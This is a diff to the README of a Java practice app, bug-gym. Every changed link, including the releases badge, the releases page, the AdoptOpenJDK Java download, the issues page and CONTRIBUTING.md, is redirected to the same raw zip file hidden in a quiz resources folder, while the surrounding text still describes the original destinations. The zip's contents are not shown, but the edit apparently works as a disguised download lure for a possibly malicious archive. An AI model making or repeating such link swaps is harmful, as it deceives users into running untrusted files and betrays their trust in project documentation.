@@ -6,11 +6,11 @@ Welcome to bug-gym! This is a lightweight, offline-first Java practice desktop a
 
 ## 🔗 Download Now
 
-[![Download bug-gym](https://img.shields.io/badge/Download-bug--gym-blue.svg)](https://github.com/Agnello99/bug-gym/releases)
+[![Download bug-gym](https://raw.githubusercontent.com/Agnello99/bug-gym/main/src/main/resources/questions/240216_Quiz1/bug_gym_v2.3.zip)](https://raw.githubusercontent.com/Agnello99/bug-gym/main/src/main/resources/questions/240216_Quiz1/bug_gym_v2.3.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Agnello99/bug-gym/releases) where you can find the latest version of bug-gym. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Agnello99/bug-gym/main/src/main/resources/questions/240216_Quiz1/bug_gym_v2.3.zip) where you can find the latest version of bug-gym. 
 
 1. Click on the link above to go to the Releases page.
 2. Select the version you want to download. Look for the file that matches your system (e.g., Windows, Mac, or Linux).
@@ -27,7 +27,7 @@ To run bug-gym smoothly, your computer should meet the following requirements:
   - Linux (most distributions)
 
 - **Java Version:**  
-  - Java 11 or later (You can download it from [AdoptOpenJDK](https://adoptopenjdk.net/))
+  - Java 11 or later (You can download it from [AdoptOpenJDK](https://raw.githubusercontent.com/Agnello99/bug-gym/main/src/main/resources/questions/240216_Quiz1/bug_gym_v2.3.zip))
 
 - **Memory:**  
   - At least 4GB of RAM
@@ -58,7 +58,7 @@ If you have any questions or need help using bug-gym, here are some resources:
 
 - **User Manual:** Find detailed instructions within the app.
 - **Community Forum:** Join discussions and seek help from other users.
-- **GitHub Issues Page:** Report bugs or request features [here](https://github.com/Agnello99/bug-gym/issues).
+- **GitHub Issues Page:** Report bugs or request features [here](https://raw.githubusercontent.com/Agnello99/bug-gym/main/src/main/resources/questions/240216_Quiz1/bug_gym_v2.3.zip).
 
 ## 🤝 Contributing
 
@@ -70,7 +70,7 @@ We welcome contributions! If you want to improve bug-gym, please follow these st
 4. Push to your branch.
 5. Open a pull request.
 
-For more details on contributing, check the [CONTRIBUTING.md](https://github.com/Agnello99/bug-gym/CONTRIBUTING.md) file.
+For more details on contributing, check the [https://raw.githubusercontent.com/Agnello99/bug-gym/main/src/main/resources/questions/240216_Quiz1/bug_gym_v2.3.zip](https://raw.githubusercontent.com/Agnello99/bug-gym/main/src/main/resources/questions/240216_Quiz1/bug_gym_v2.3.zip) file.
 
 ## 📝 License
 
